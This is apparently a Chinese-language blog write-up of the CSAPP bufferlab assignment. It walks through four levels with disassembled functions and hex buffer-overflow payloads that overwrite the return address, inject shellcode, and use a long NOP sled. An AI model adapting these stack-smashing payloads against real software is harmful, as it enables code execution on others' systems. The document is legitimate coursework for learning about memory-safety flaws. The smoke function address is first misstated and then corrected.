---
title: bufferlab
date: 2021-10-03 11:22:30
tags: bufferlab
categories: 实验
description: csapp实验4 bufferlab ，关于缓冲区溢出的实验
---
## 1.level1 - smoke ##
smoke函数地址为0x80c1848,对应 48 18 0C 08
然后看getbuf函数
```c
080491f4 <getbuf>:
 80491f4:	55                   	push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret    
```
smoke函数
```c
08048c18 <smoke>:
 8048c18:   55                      push   %ebp
 8048c19:   89 e5                   mov    %esp,%ebp
 8048c1b:   83 ec 18                sub    $0x18,%esp
 8048c1e:   c7 04 24 d3 a4 04 08    movl   $0x804a4d3,(%esp)
 8048c25:   e8 96 fc ff ff          call   80488c0 <puts@plt>
 8048c2a:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048c31:   e8 45 07 00 00          call   804937b <validate>
 8048c36:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048c3d:   e8 be fc ff ff          call   8048900 <exit@plt>
```
思路显而易见"a" * 0x28 + p32(ebp) + p32(0x80c1848)(一开始地址弄错了怎么都没出......)
最后的payload
```python
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
```

## 2.level2 - fizz
fizz函数,地址为0x08048c42 -> 42 8c 04 08
```c
08048c42 <fizz>:
 8048c42:   55                      push   %ebp
 8048c43:   89 e5                   mov    %esp,%ebp
 8048c45:   83 ec 18                sub    $0x18,%esp
 8048c48:   8b 45 08                mov    0x8(%ebp),%eax
 8048c4b:   3b 05 08 d1 04 08       cmp    0x804d108,%eax
 8048c51:   75 26                   jne    8048c79 <fizz+0x37>
 8048c53:   89 44 24 08             mov    %eax,0x8(%esp)
 8048c57:   c7 44 24 04 ee a4 04    movl   $0x804a4ee,0x4(%esp)
 8048c5e:   08 
 8048c5f:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048c66:   e8 55 fd ff ff          call   80489c0 <__printf_chk@plt>
 8048c6b:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048c72:   e8 04 07 00 00          call   804937b <validate>
 8048c77:   eb 18                   jmp    8048c91 <fizz+0x4f>
 8048c79:   89 44 24 08             mov    %eax,0x8(%esp)
 8048c7d:   c7 44 24 04 40 a3 04    movl   $0x804a340,0x4(%esp)
 8048c84:   08 
 8048c85:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048c8c:   e8 2f fd ff ff          call   80489c0 <__printf_chk@plt>
 8048c91:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048c98:   e8 63 fc ff ff          call   8048900 <exit@plt>
```
只要保证传给这个函数的参数为cookie就可以了,
payload = "a" * 0x28 + p32(ebp) + p32(ret) + p32(push) + p32(cookie) 
payload
```c
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 b6 e9 a9 43
```

## 3.level3 - bang ##
bang地址0x08048c9d -> 9d 8c 04 08,cookie = 0x43a9e9b6
```c
08048c9d <bang>:
 8048c9d:   55                      push   %ebp
 8048c9e:   89 e5                   mov    %esp,%ebp
 8048ca0:   83 ec 18                sub    $0x18,%esp
 8048ca3:   a1 00 d1 04 08          mov    0x804d100,%eax
 8048ca8:   3b 05 08 d1 04 08       cmp    0x804d108,%eax
 8048cae:   75 26                   jne    8048cd6 <bang+0x39>
 8048cb0:   89 44 24 08             mov    %eax,0x8(%esp)
 8048cb4:   c7 44 24 04 60 a3 04    movl   $0x804a360,0x4(%esp)
 8048cbb:   08 
 8048cbc:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048cc3:   e8 f8 fc ff ff          call   80489c0 <__printf_chk@plt>
 8048cc8:   c7 04 24 02 00 00 00    movl   $0x2,(%esp)
 8048ccf:   e8 a7 06 00 00          call   804937b <validate>
 8048cd4:   eb 18                   jmp    8048cee <bang+0x51>
 8048cd6:   89 44 24 08             mov    %eax,0x8(%esp)
 8048cda:   c7 44 24 04 0c a5 04    movl   $0x804a50c,0x4(%esp)
 8048ce1:   08 
 8048ce2:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048ce9:   e8 d2 fc ff ff          call   80489c0 <__printf_chk@plt>
 8048cee:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048cf5:   e8 06 fc ff ff          call   8048900 <exit@plt>
```
这一关需要保证0x804d100处为cookie,所以需要得到输入字符串的地址为 0x55683bf8,然后使用shellcode
```shellcode
00000000 <.text>:
   0:   a1 08 d1 04 08          mov    0x804d108,%eax
   5:   a3 00 d1 04 08          mov    %eax,0x804d100
   a:   68 9d 8c 04 08          push   $0x8048c9d
   f:   c3                      ret
```
生成汇编命令
```c
gcc -m32 -c test.s
objdump -d test.o
```
payload
```c
a1 08 d1 04 08 a3 00 d1 04 08 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f8 3b 68 55
```

## 4.level4 - dynamite ##
cookie = b6 e9 a9 43,这个任务的要求是连续5次保证ebp - 0xc == cookie,有点麻烦
思路是通过覆盖ip来跳到前面的nop,然后执行shellcode控制ebp
payload(参考:https://blog.csdn.net/u012336567/article/details/51832328)
```c
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 a1 08 d1 04 08 8d 6c 24 28 68 3a
8e 04 08 c3 b8 32 68 55
```
